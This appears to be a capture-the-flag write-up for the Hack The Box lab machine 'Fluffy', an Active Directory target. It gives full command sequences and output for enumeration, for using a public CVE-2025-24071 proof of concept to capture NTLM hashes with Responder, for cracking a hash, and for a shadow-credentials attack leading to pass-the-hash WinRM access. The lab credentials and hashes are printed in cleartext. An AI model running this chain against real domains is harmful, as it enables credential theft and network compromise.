---
created: 2026-08-16
updated: 2026-09-20
---
## Initial enumeration
### Scanning ports 

```bash
sudo nmap -sV -sC 10.129.232.88 -Pn -oA nmap/tcp_ports
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-16 11:15 EDT
Nmap scan report for 10.129.232.88
Host is up (0.067s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-16 22:15:28Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-08-16T22:16:52+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-08-16T22:16:52+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-08-16T22:16:52+00:00; +7h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-08-16T22:16:52+00:00; +7h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-16T22:16:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.56 seconds
```

### RootDSE

- The LDAP port is open. To learn the base DN (and the domain), we can query RootDSE anonymously (anonymous queries to RootDSE are allowed even if normal queries require credentials):

```bash
nmap -Pn -p 389,636 --script ldap-rootdse 10.129.232.88
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-16 11:30 EDT
Nmap scan report for 10.129.232.88
Host is up (0.070s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=fluffy,DC=htb
|       ldapServiceName: fluffy.htb:dc01$@FLUFFY.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=fluffy,DC=htb
|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=fluffy,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=fluffy,DC=htb
|       namingContexts: DC=fluffy,DC=htb
|       namingContexts: CN=Configuration,DC=fluffy,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=fluffy,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=fluffy,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=fluffy,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 237695
|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=fluffy,DC=htb
|       dnsHostName: DC01.fluffy.htb
|       defaultNamingContext: DC=fluffy,DC=htb
|       currentTime: 20260816223025.0Z
|_      configurationNamingContext: CN=Configuration,DC=fluffy,DC=htb
636/tcp open  ldapssl
Service Info: Host: DC01; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 3.34 seconds
```

- We learn the domain: `fluffy.htb`.
- The FQDN of the Domain Controller is `dc01.fluffy.htb`.

### Scanning SMB shares

- SMB anonymous access is allowed:

```bash
nxc smb 10.129.232.88
```

```bash
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

- However, enumerating shares doesn't succeed, because access is denied to the anonymous user.
- It's time to use the credentials we're given:

```bash
nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```

```bash
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share 
```

- Recursively list share contents:

```bash
smbmap -u 'j.fleischman' -p 'J0elTHEM4n1990!' -d 'fluffy.htb' -H 10.129.232.88 -r

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                                                [|] Checking for open ports...                                                                                                [*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.232.88:445	Name: 10.129.232.88       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	./IPC$
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	lsass
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	scerpc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-3a8-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	epmapper
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-1f8-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	eventlog
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-464-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	atsvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-62c-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-290-0
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	wkssvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-290-1
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	RpcProxy\49689
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	762a16d1406f5de0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	RpcProxy\593
	fr--r--r--                5 Sun Dec 31 19:03:58 1600	srvsvc
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	netdfs
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	vgauth-service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	tapsrv
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ROUTER
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-27c-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-c20-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	W32TIME_ALT
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-c50-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	cert
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-338-0
	IT                                                	READ, WRITE	
	./IT
	dr--r--r--                0 Sun Aug 16 18:46:09 2026	.
	dr--r--r--                0 Sun Aug 16 18:46:09 2026	..
	dr--r--r--                0 Fri May 16 10:51:49 2025	Everything-1.4.1.1026.x64
	fr--r--r--          1827464 Fri May 16 10:51:49 2025	Everything-1.4.1.1026.x64.zip
	dr--r--r--                0 Fri May 16 10:51:49 2025	KeePass-2.58
	fr--r--r--          3225346 Fri May 16 10:51:49 2025	KeePass-2.58.zip
	fr--r--r--           169963 Sat May 17 10:31:07 2025	Upgrade_Notice.pdf
	NETLOGON                                          	READ ONLY	Logon server share 
	./NETLOGON
	dr--r--r--                0 Thu Apr 17 11:59:28 2025	.
	dr--r--r--                0 Thu Apr 17 11:59:28 2025	..
	SYSVOL                                            	READ ONLY	Logon server share 
	./SYSVOL
	dr--r--r--                0 Thu Apr 17 11:59:28 2025	.
	dr--r--r--                0 Thu Apr 17 11:59:28 2025	..
	dr--r--r--                0 Thu Apr 17 11:59:28 2025	fluffy.htb
[*] Closed 1 connections
```

- The PDF stands out: `Upgrade_Notice.pdf`.
- To download it:

```bash
smbmap -u 'j.fleischman' -p 'J0elTHEM4n1990!' -d 'fluffy.htb' -H 10.129.232.88 --download 'IT/Upgrade_Notice.pdf'
```

### Inspecting the PDF

- In the list of vulnerabilities found in the PDF, see:

| CVE ID           | Severity |
| ---------------- | -------- |
| `CVE-2025-24996` | Critical |
| `CVE-2025-24071` | Critical |
| `CVE-2025-46785` | High     |
| `CVE-2025-29968` | High     |
| `CVE-2025-21193` | Medium   |
| `CVE-2025-3445`  | Low      |

### Exploiting `CVE-2025-24071`

- To exploit the vulnerability, first generate the malicious ZIP file. You can use [this PoC](https://github.com/0x6rss/CVE-2025-24071_PoC/blob/main/poc.py?source=post_page-----96703a596d54---------------------------------------):

```bash
wget https://raw.githubusercontent.com/0x6rss/CVE-2025-24071_PoC/refs/heads/main/poc.py -O CVE_2025_24071_PoC.p
```

```bash
python3 CVE_2025_24071_PoC.py

Enter your file name: file
Enter IP (EX: 192.168.1.162): 10.129.232.88
completed
```

- Then start `Responder` to later capture NTLMv2 hash:

```bash
sudo responder -I tun0
```

- Then put the `exploit.zip` file to the IT share you can write to:

```bash
smbclient //10.129.232.88/IT -U j.fleischman
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (2.0 kb/s) (average 2.0 kb/s)
smb: \> ls
  .                                   D        0  Sun Aug 16 19:18:43 2026
  ..                                  D        0  Sun Aug 16 19:18:43 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  exploit.zip                         A      318  Sun Aug 16 19:18:43 2026
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

		5842943 blocks of size 4096. 2138713 blocks available
smb: \>
```
## Capturing and cracking the hash

- We have to wait a little bit to catch the NTLM hash for user `p.agila`:

```bash
p.agila::FLUFFY:e504f27800f668b3:80FD9C15C647F9798458C8B4CF6FAF85:01010000000000000030D4DD5229DC01E94B7730298A35DF000000000200080041005A004100440001001E00570049004E002D0058003300320059005800570032003600470053004F0004003400570049004E002D0058003300320059005800570032003600470053004F002E0041005A00410044002E004C004F00430041004C000300140041005A00410044002E004C004F00430041004C000500140041005A00410044002E004C004F00430041004C00070008000030D4DD5229DC010600040002000000080030003000000000000000010000000020000064C64E9F46D7371668D593575E96A6C28443613B10035E23601665D8EFD9E0550A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310031000000000000000000
```

- Then save the hash into a file and crack it:


```bash
hashcat hash.txt -m 5600 ~/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) Ultra 5 125U, 2914/5893 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /home/user/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

P.AGILA::FLUFFY:e504f27800f668b3:80fd9c15c647f9798458c8b4cf6faf85:01010000000000000030d4dd5229dc01e94b7730298a35df000000000200080041005a004100440001001e00570049004e002d0058003300320059005800570032003600470053004f0004003400570049004e002d0058003300320059005800570032003600470053004f002e0041005a00410044002e004c004f00430041004c000300140041005a00410044002e004c004f00430041004c000500140041005a00410044002e004c004f00430041004c00070008000030d4dd5229dc010600040002000000080030003000000000000000010000000020000064c64e9f46d7371668d593575e96a6c28443613b10035e23601665d8efd9e0550a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310031000000000000000000:prometheusx-303
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:e504f27800f668b3:80fd9c15c647f97984...000000
Time.Started.....: Sun Aug 16 12:21:53 2026 (4 secs)
Time.Estimated...: Sun Aug 16 12:21:57 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/user/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1230.3 kH/s (1.69ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4518912/14344384 (31.50%)
Rejected.........: 0/4518912 (0.00%)
Restore.Point....: 4515840/14344384 (31.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: prored -> prod45

Started: Sun Aug 16 12:21:28 2026
Stopped: Sun Aug 16 12:21:58 2026
```

## Bloodhound

- Run  the **BloodHound Python collector**. Its job is to **query Active Directory and collect relationship/permission data** that BloodHound can later visualize and analyze.

```bash
bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -c all --zip -ns 10.10.11.69
```

- Then upload the resulting ZIP to BloodHound. 



```bash
net rpc group addmem 'Service Accounts' p.agila -U fluffy.htb/p.agila%prometheusx-303 -S 10.129.232.88
```

- Check:

```bash
net rpc group members 'Service Accounts' -U fluffy.htb/p.agila%prometheusx-303 -S 10.129.232.88
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

- Shadow credential attacks
- `Certipy-ad`

```bash
certipy shadow auto -target fluffy.htb -dc-ip 10.129.232.88 -username p.agila@fluffy.htb -password prometheusx-303 -account winrm_svc
```

```bash
evil-winrm -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 -i 10.129.232.88
```